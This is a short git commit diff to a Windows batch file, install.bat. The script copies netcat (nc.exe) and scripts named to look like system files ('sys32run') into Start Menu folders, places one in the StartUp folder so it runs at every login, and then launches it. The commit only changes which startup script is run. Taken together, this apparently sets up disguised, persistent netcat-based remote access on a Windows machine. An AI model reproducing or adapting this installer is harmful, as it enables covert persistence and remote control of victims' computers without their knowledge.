384a8e2b849a43703f7e500989227fe4458ba2d6
strongpapazola <48545591+strongpapazola@users.noreply.github.com>
2020-07-16 14:52:22 +0700

    Update install.bat

--- install.bat
+++ install.bat
@@ -4,5 +4,5 @@ copy "%x%\sys32run1.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\s
 copy "%x%\sys32run2.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\"
 copy "%x%\nc.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\"
 copy "%x%\sys32run.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
-"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start.bat"
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\sys32run.bat"
 pause
